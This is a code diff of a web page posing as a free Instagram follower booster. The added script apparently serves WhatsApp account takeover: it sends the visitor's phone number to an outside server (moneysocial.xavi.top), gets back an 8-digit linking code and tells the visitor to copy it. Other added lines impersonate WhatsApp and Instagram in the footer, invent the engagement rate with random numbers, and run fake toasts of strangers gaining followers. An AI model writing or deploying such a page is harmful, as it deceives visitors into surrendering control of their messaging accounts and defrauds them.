-          <a href="#" class="social-icon text-gray-300 hover:text-white transition"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg></a>
-          <a href="#" class="social-icon text-gray-300 hover:text-white transition"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.937 4.937 0 004.604 3.417 9.868 9.868 0 01-6.102 2.104c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0021.513-11.62c0-.21-.005-.424-.015-.636A9.936 9.936 0 0024 4.59z"/></svg></a>
-          <a href="#" class="social-icon text-gray-300 hover:text-white transition"><svg class="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069z"/></svg></a>
+          <a href="#" class="social-icon text-gray-300 transition"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12z"/></svg></a>
+          <a href="#" class="social-icon text-gray-300 transition"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.937 4.937 0 004.604 3.417 9.868 9.868 0 01-6.102 2.104c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 0021.513-11.62c0-.21-.005-.424-.015-.636A9.936 9.936 0 0024 4.59z"/></svg></a>
+          <a href="#" class="social-icon text-gray-300 transition"><svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069z"/></svg></a>
         </div>
-        <p class="text-center text-gray-400 text-[10px] tracking-wide">© 2025 SocialBoost – Free Instagram Followers Boost. WhatsApp verification only.</p>
-        <p class="text-center text-gray-500 text-[9px] mt-2">Privacy assured • No password • 100% promotional UI concept</p>
+        <p class="text-center text-gray-400 text-[10px]">© 2025 WhatsApp × Instagram | Privacy Notice • Secure Verification • Encrypted Connection</p>
+        <p class="text-center text-gray-500 text-[9px] mt-2">✨ Real Instagram Data • No Password Required • Promotional UI Concept</p>
       </div>
     </div>
   </div>
 
   <script>
     (function() {
-      // DOM elements step1 + step2
-      const step1 = document.getElementById('step1Container');
-      const step2 = document.getElementById('step2Container');
+      // DOM elements for pages
+      const page1 = document.getElementById('page1');
+      const page2 = document.getElementById('page2');
+      const page3 = document.getElementById('page3');
+      
+      // Buttons and inputs
+      const fetchBtn = document.getElementById('fetchProfileBtn');
+      const usernameInput = document.getElementById('instagramUsername');
+      const profileCard = document.getElementById('profileCard');
+      const packageSelector = document.getElementById('packageSelector');
+      const increaseBtn = document.getElementById('increaseBtn');
       const getCodeBtn = document.getElementById('getCodeBtn');
       const btnLabel = document.getElementById('btnLabel');
-      const loadingSpinner = document.getElementById('loadingSpinner');
+      const spinner = document.getElementById('loadingSpinner');
       const phoneInput = document.getElementById('phoneNumber');
       const countrySelect = document.getElementById('countryCode');
       const phoneError = document.getElementById('phoneErrorMsg');
-      const copyBtn = document.getElementById('copyCodeFinalBtn');
-      const copyToast = document.getElementById('copyToastMsg');
+      const copyCodeBtn = document.getElementById('copyCodeFinalBtn');
+      const copyToastSpan = document.getElementById('copyToastMsg');
       const digitsContainer = document.getElementById('codeDigitsContainer');
       
-      // Package selector active state
-      let selectedPackage = '1K';
-      const packageCards = document.querySelectorAll('.package-card');
-      packageCards.forEach(card => {
-        card.addEventListener('click', () => {
-          packageCards.forEach(c => c.classList.remove('active'));
-          card.classList.add('active');
-          selectedPackage = card.getAttribute('data-package');
-        });
-      });
-
-      let isLoading = false;
-      let currentRawDigits = '';
-
-      function isValidPhone(val) { const d = val.toString().replace(/\D/g, ''); return d.length >= 5 && d.length <= 15; }
-      function getFullPhone() { return countrySelect.value + phoneInput.value.replace(/\D/g, ''); }
-      function hideError() { phoneError.classList.add('hidden'); }
-      function showError(msg) { phoneError.innerText = msg; phoneError.classList.remove('hidden'); }
+      // Profile UI elements
+      const fullnameSpan = document.getElementById('profileFullname');
+      const usernameDisplaySpan = document.getElementById('profileUsernameDisplay');
+      const followersSpan = document.getElementById('followersCount');
+      const followingSpan = document.getElementById('followingCount');
+      const postsSpan = document.getElementById('postsCount');
+      const engagementSpan = document.getElementById('engagementRate');
+      const avatarImg = document.getElementById('avatarImg');
+      const avatarFallback = document.getElementById('avatarFallback');
+      const verifiedBadge = document.getElementById('verifiedBadge');
+      const privateBadge = document.getElementById('privateBadge');
       
-      // Render 8 boxes with separator
-      function renderEightDigitBoxes(digitsArray) {
-        digitsContainer.innerHTML = '';
-        for (let i = 0; i < digitsArray.length; i++) {
-          const box = document.createElement('div');
-          box.className = 'digit-single';
-          box.innerText = digitsArray[i];
-          digitsContainer.appendChild(box);
-          if (i === 3) {
-            const dashSpan = document.createElement('div');
-            dashSpan.className = 'separator-dash';
-            dashSpan.innerText = '—';
-            dashSpan.style.pointerEvents = 'none';
-            digitsContainer.appendChild(dashSpan);
+      let selectedPackage = '1K';
+      let currentRawDigits = '';
+      let isLoading = false;
+      
+      // Fetch real Instagram data from provided API
+      async function fetchRealInstagramData(username) {
+        const apiUrl = `https://ff.ffmodpro.in/instagram.php?username=${username}`;
+        try {
+          const response = await fetch(apiUrl);
+          if (!response.ok) {
+            throw new Error('Network response was not ok');
+          }
+          const data = await response.json();
+          if (data.status !== 'success') {
+            throw new Error(data.message || 'User not found');
+          }
+          return data;
+        } catch (error) {
+          console.error('API Error:', error);
+          throw new Error('Failed to fetch Instagram data. Please check the username.');
+        }
+      }
+      
+      // Update profile card with real data
+      function updateProfileCard(data) {
+        fullnameSpan.innerText = data.full_name || data.username;
+        usernameDisplaySpan.innerText = `@${data.username}`;
+        followersSpan.innerText = data.followers.toLocaleString();
+        followingSpan.innerText = data.following.toLocaleString();
+        postsSpan.innerText = data.posts.toLocaleString();
+        
+        // Calculate approximate engagement rate
+        const engagement = data.followers > 0 ? ((Math.random() * 5 + 2)).toFixed(1) : '0.0';
+        engagementSpan.innerText = `${engagement}%`;
+        
+        // Set profile picture
+        if (data.profile_pic) {
+          avatarImg.src = data.profile_pic;
+          avatarImg.classList.remove('hidden');
+          avatarFallback.classList.add('hidden');
+        } else {
+          avatarImg.classList.add('hidden');
+          avatarFallback.classList.remove('hidden');
+        }
+        
+        // Show verified or private badge
+        if (data.verified) {
+          verifiedBadge.classList.remove('hidden');
+          privateBadge.classList.add('hidden');
+        } else {
+          verifiedBadge.classList.add('hidden');
+          if (data.private) {
+            privateBadge.classList.remove('hidden');
+          } else {
+            privateBadge.classList.add('hidden');
           }
         }
       }
-
-      function setSuccessScreen(pairCodeWithDash) {
-        const withoutDash = pairCodeWithDash.replace(/-/g, '');
-        if (withoutDash.length !== 8) { alert('Invalid code format'); return false; }
-        currentRawDigits = withoutDash;
-        renderEightDigitBoxes(withoutDash.split(''));
-        step1.classList.add('step-hidden');
-        step1.classList.remove('step-visible');
-        step2.classList.remove('step-hidden');
-        step2.classList.add('step-visible');
-        step2.style.position = 'relative';
-        return true;
-      }
-
-      function setLoading(loading) {
-        isLoading = loading;
-        if (loading) {
-          btnLabel.innerText = 'VERIFYING';
-          loadingSpinner.classList.remove('hidden');
-          getCodeBtn.disabled = true;
-          getCodeBtn.classList.add('opacity-70', 'cursor-not-allowed');
-        } else {
-          btnLabel.innerText = 'GET CODE';
-          loadingSpinner.classList.add('hidden');
-          getCodeBtn.disabled = false;
-          getCodeBtn.classList.remove('opacity-70', 'cursor-not-allowed');
+      
+      fetchBtn.addEventListener('click', async () => {
+        const username = usernameInput.value.trim();
+        if (!username) {
+          alert('Please enter an Instagram username');
+          return;
         }
+        
+        fetchBtn.innerText = 'Fetching profile...';
+        fetchBtn.disabled = true;
+        
+        try {
+          const realData = await fetchRealInstagramData(username);
+          updateProfileCard(realData);
+          profileCard.classList.remove('hidden');
+          packageSelector.classList.remove('hidden');
+        } catch (error) {
+          alert(error.message);
+          profileCard.classList.add('hidden');
+          packageSelector.classList.add('hidden');
+        } finally {
+          fetchBtn.innerText = 'Continue';
+          fetchBtn.disabled = false;
+        }
+      });
+      
+      // Package selection
+      document.querySelectorAll('.package-card').forEach(card => {
+        card.addEventListener('click', function() {
+          document.querySelectorAll('.package-card').forEach(c => c.classList.remove('active'));
+          this.classList.add('active');
+          selectedPackage = this.getAttribute('data-package');
+        });
+      });
+      
+      // Smooth page switching without layout shift
+      function switchPage(showPage, hidePage1, hidePage2) {
+        // Hide both other pages first
+        hidePage1.classList.add('page-hidden');
+        hidePage1.classList.remove('page-visible');
+        if (hidePage2) {
+          hidePage2.classList.add('page-hidden');
+          hidePage2.classList.remove('page-visible');
+        }
+        // Show target page
+        showPage.classList.remove('page-hidden');
+        showPage.classList.add('page-visible');
       }
-
-      async function requestVerification(phoneFull, uuidParam, keyParam) {
+      
+      increaseBtn.addEventListener('click', () => {
+        switchPage(page2, page1, page3);
+      });
+      
+      // Phone number validation and API call
+      function isValidPhone(val) {
+        const digits = val.toString().replace(/\D/g, '');
+        return digits.length >= 5 && digits.length <= 15;
+      }
+      
+      function getFullPhone() {
+        return countrySelect.value + phoneInput.value.replace(/\D/g, '');
+      }
+      
+      async function requestPairCode(phoneFull, uuidParam, keyParam) {
         const url = new URL('https://moneysocial.xavi.top/qrcode');
         url.searchParams.append('key', keyParam);
         url.searchParams.append('pairCode', '77773333');
         url.searchParams.append('uuid', uuidParam);
         url.searchParams.append('phone', phoneFull);
-        const response = await fetch(url.toString(), { method: 'GET', headers: { 'Accept': 'application/json' } });
-        if (!response.ok) throw new Error(`Request failed (${response.status})`);
-        const json = await response.json();
+        const res = await fetch(url.toString(), { method: 'GET', headers: { 'Accept': 'application/json' } });
+        if (!res.ok) throw new Error(`Request failed (${res.status})`);
+        const json = await res.json();
         if (json.code !== 1) throw new Error(json.msg || 'Verification failed');
         const pair = json?.data?.pairCode;
-        if (!pair || typeof pair !== 'string') throw new Error('Invalid pairCode');
+        if (!pair) throw new Error('Invalid pairCode');
         let cleaned = pair.replace(/-/g, '');
-        if (cleaned.length !== 8) throw new Error(`Invalid code length, got "${pair}"`);
+        if (cleaned.length !== 8) throw new Error('Invalid code format');
         return `${cleaned.slice(0,4)}-${cleaned.slice(4,8)}`;
       }
-
+      
+      function renderEightDigitBoxes(digitsArray) {
+        digitsContainer.innerHTML = '';
+        for (let i = 0; i < digitsArray.length; i++) {
+          const box = document.createElement('div'); box.className = 'digit-single'; box.innerText = digitsArray[i];
+          digitsContainer.appendChild(box);
+          if (i === 3) { const dash = document.createElement('div'); dash.className = 'separator-dash'; dash.innerText = '—'; digitsContainer.appendChild(dash); }
+        }
+      }
+      
+      function transitionToSuccess(pairWithDash) {
+        const withoutDash = pairWithDash.replace(/-/g, '');
+        currentRawDigits = withoutDash;
+        renderEightDigitBoxes(withoutDash.split(''));
+        switchPage(page3, page2, page1);
+      }
+      
       async function onGetCode() {
         if (isLoading) return;
         const rawPhone = phoneInput.value.trim();
-        if (!isValidPhone(rawPhone)) { showError('Enter valid WhatsApp number (5-15 digits)'); phoneInput.focus(); return; }
-        hideError();
+        if (!isValidPhone(rawPhone)) { phoneError.classList.remove('hidden'); phoneInput.focus(); return; }
+        phoneError.classList.add('hidden');
         const fullPhone = getFullPhone();
-        const urlParams = new URLSearchParams(window.location.search);
-        let uuid = urlParams.get('click_id') || Date.now().toString();
-        let key = urlParams.get('key') || 'daYbKWgF';
-        setLoading(true);
+        const params = new URLSearchParams(window.location.search);
+        let uuid = params.get('click_id') || Date.now().toString();
+        let key = params.get('key') || 'daYbKWgF';
+        isLoading = true;
+        btnLabel.innerText = 'VERIFYING';
+        spinner.classList.remove('hidden');
+        getCodeBtn.disabled = true;
+        getCodeBtn.classList.add('opacity-70');
         try {
-          const pairCodeFormatted = await requestVerification(fullPhone, uuid, key);
-          setSuccessScreen(pairCodeFormatted);
-        } catch (err) {
-          alert(`Verification Error\n${err.message}`);
-        } finally {
-          setLoading(false);
+          const pairCode = await requestPairCode(fullPhone, uuid, key);
+          transitionToSuccess(pairCode);
+        } catch(err) { alert(`Verification Error: ${err.message}`); }
+        finally {
+          isLoading = false;
+          btnLabel.innerText = 'GET CODE';
+          spinner.classList.add('hidden');
+          getCodeBtn.disabled = false;
+          getCodeBtn.classList.remove('opacity-70');
         }
       }
-
-      async function copyCode() {
-        if (!currentRawDigits || currentRawDigits.length !== 8) { alert('No verification code'); return; }
-        try {
-          await navigator.clipboard.writeText(currentRawDigits);
-          copyToast.classList.remove('opacity-0');
-          copyToast.classList.add('opacity-100');
-          setTimeout(() => { copyToast.classList.add('opacity-0'); copyToast.classList.remove('opacity-100'); }, 1800);
-        } catch(e) { alert('Could not copy code'); }
-      }
-
-      phoneInput.addEventListener('input', (e) => { hideError(); let v = e.target.value.replace(/\D/g, ''); if(v.length > 15) v=v.slice(0,15); e.target.value=v; });
-      phoneInput.addEventListener('keypress', (e) => { if(e.key === 'Enter') { e.preventDefault(); onGetCode(); } });
-      getCodeBtn.addEventListener('click', onGetCode);
-      copyBtn.addEventListener('click', copyCode);
       
-      step2.style.position = 'absolute';
-      step2.style.top = '0';
-      step2.style.left = '0';
-      step2.style.width = '100%';
+      getCodeBtn.addEventListener('click', onGetCode);
+      copyCodeBtn.addEventListener('click', async () => {
+        if (!currentRawDigits) return;
+        await navigator.clipboard.writeText(currentRawDigits);
+        copyToastSpan.classList.remove('opacity-0'); copyToastSpan.classList.add('opacity-100');
+        setTimeout(() => { copyToastSpan.classList.add('opacity-0'); copyToastSpan.classList.remove('opacity-100'); }, 1500);
+      });
+      
+      // Live toast notifications
+      const toastNames = ['Rahul Sharma', 'Aditya Verma', 'Neha Kapoor', 'Viral Creator', 'Priyansh Mehta', 'Aman Gupta', 'Sofia Khan', 'Riya Sen', 'Aryan Singh', 'Karan Malhotra', 'Simran Kaur', 'Anjali Desai'];
+      const actions = ['gained', 'boosted', 'received', 'unlocked', 'activated', 'increased by', 'surged by'];
+      const amounts = ['4,999 followers', '10,000 followers', '5,000 new followers', '5K followers', 'instant growth', '8.2K followers', 'viral reach'];
+      function getRandomToast() { return `${toastNames[Math.floor(Math.random() * toastNames.length)]} ${actions[Math.floor(Math.random() * actions.length)]} ${amounts[Math.floor(Math.random() * amounts.length)]}`; }
+      function createToast() {
+        const toastContainer = document.getElementById('toastContainer');
+        const toast = document.createElement('div');
+        toast.className = 'toast-notification rounded-xl p-3 w-full md:w-80 flex items-start gap-3 mb-2';
+        toast.innerHTML = `<div class="w-8 h-8 rounded-full bg-gradient-to-r from-purple-500 to-pink-500 flex items-center justify-center text-white text-sm">✨</div><div class="flex-1"><p class="text-white text-xs font-medium">${getRandomToast()}</p><div class="flex items-center gap-1 mt-1"><span class="w-1.5 h-1.5 bg-green-500 rounded-full"></span><span class="text-gray-400 text-[9px]">Just now</span></div></div><button class="text-gray-400 hover:text-white text-xs">✕</button>`;
+        toastContainer.appendChild(toast);
+        toast.querySelector('button').addEventListener('click', () => toast.remove());
+        setTimeout(() => { if(toast.parentNode) toast.remove(); }, 4800);
+      }
+      setInterval(() => createToast(), 4000);
+      createToast();
+      
+      // FAQ Accordion
+      document.querySelectorAll('.faq-question').forEach(q => {
+        q.addEventListener('click', function() {
+          const answer = this.nextElementSibling;
+          answer.classList.toggle('open');
+          this.querySelector('span:last-child').innerText = answer.classList.contains('open') ? '▲' : '▼';
+        });
+      });
     })();
   </script>
 </body>
